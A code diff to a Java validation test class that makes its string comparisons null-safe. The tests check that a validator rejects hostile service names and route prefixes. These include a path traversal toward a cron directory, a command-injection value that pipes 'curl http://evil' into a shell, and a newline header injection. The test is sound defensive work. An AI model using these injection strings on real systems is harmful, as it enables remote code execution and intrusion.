@@ -51,7 +51,7 @@ class ResourceModuleRequestValidationTest {
         ResourceModuleRequest r = valid();
         r.setServiceName("");
         assertThat(validator.validate(r))
-            .anyMatch(v -> v.getPropertyPath().toString().equals("serviceName"));
+            .anyMatch(v -> "serviceName".equals(v.getPropertyPath().toString()));
     }
 
     @Test
@@ -59,7 +59,7 @@ class ResourceModuleRequestValidationTest {
         ResourceModuleRequest r = valid();
         r.setServiceName("../../../../etc/cron.d/x");
         assertThat(validator.validate(r))
-            .anyMatch(v -> v.getPropertyPath().toString().equals("serviceName"));
+            .anyMatch(v -> "serviceName".equals(v.getPropertyPath().toString()));
     }
 
     @Test
@@ -67,7 +67,7 @@ class ResourceModuleRequestValidationTest {
         ResourceModuleRequest r = valid();
         r.setServiceName("x';curl http://evil|sh;'");
         assertThat(validator.validate(r))
-            .anyMatch(v -> v.getPropertyPath().toString().equals("serviceName"));
+            .anyMatch(v -> "serviceName".equals(v.getPropertyPath().toString()));
     }
 
     @Test
@@ -75,7 +75,7 @@ class ResourceModuleRequestValidationTest {
         ResourceModuleRequest r = valid();
         r.setClassName("order");
         assertThat(validator.validate(r))
-            .anyMatch(v -> v.getPropertyPath().toString().equals("className"));
+            .anyMatch(v -> "className".equals(v.getPropertyPath().toString()));
     }
 
     @Test
@@ -90,6 +90,6 @@ class ResourceModuleRequestValidationTest {
         ResourceModuleRequest r = valid();
         r.setRoutePrefix("/api/orders\ninjected: true");
         assertThat(validator.validate(r))
-            .anyMatch(v -> v.getPropertyPath().toString().equals("routePrefix"));
+            .anyMatch(v -> "routePrefix".equals(v.getPropertyPath().toString()));
     }
 }
